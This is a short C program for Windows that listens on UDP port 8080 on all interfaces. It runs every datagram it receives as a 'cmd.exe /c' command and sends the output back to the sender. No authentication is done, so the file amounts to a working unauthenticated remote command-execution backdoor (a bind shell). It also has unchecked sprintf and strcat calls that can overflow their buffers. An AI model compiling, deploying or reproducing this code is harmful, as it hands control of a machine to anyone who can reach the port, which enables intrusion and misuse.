#include <windows.h>
#include <stdio.h>
#include <winsock2.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

#define PORT 8080
#define BUFFER_SIZE 1024

int main() {
    WSADATA wsa;
    SOCKET sockfd;
    struct sockaddr_in server, client;
    int client_len = sizeof(client);
    char buffer[BUFFER_SIZE], commandOutput[BUFFER_SIZE * 4];

    WSAStartup(MAKEWORD(2, 2), &wsa);
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(PORT);

    bind(sockfd, (struct sockaddr *)&server, sizeof(server));
    printf("Server is running and waiting for commands...\n");

    while (1) {
        memset(buffer, 0, BUFFER_SIZE);
        memset(commandOutput, 0, sizeof(commandOutput));

        recvfrom(sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&client, &client_len);
        printf("Received command: %s\n", buffer);

        // Create pipe
        SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
        HANDLE hRead, hWrite;
        CreatePipe(&hRead, &hWrite, &saAttr, 0);
        SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

        // Set up process startup info
        PROCESS_INFORMATION pi;
        STARTUPINFO si = { sizeof(STARTUPINFO) };
        si.dwFlags |= STARTF_USESTDHANDLES;
        si.hStdOutput = hWrite;
        si.hStdError = hWrite;
        si.hStdInput = NULL;

        // Build command line
        char cmdLine[BUFFER_SIZE + 10];
        sprintf(cmdLine, "cmd.exe /c %s", buffer);

        // Create process
        if (CreateProcess(NULL, cmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
            CloseHandle(hWrite);

            DWORD bytesRead;
            char temp[BUFFER_SIZE];
            while (ReadFile(hRead, temp, BUFFER_SIZE - 1, &bytesRead, NULL) && bytesRead > 0) {
                temp[bytesRead] = '\0';
                strcat(commandOutput, temp);
            }

            CloseHandle(hRead);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        } else {
            strcpy(commandOutput, "Failed to execute command.");
        }

        sendto(sockfd, commandOutput, strlen(commandOutput), 0, (struct sockaddr *)&client, client_len);
    }

    closesocket(sockfd);
    WSACleanup();
    return 0;
}
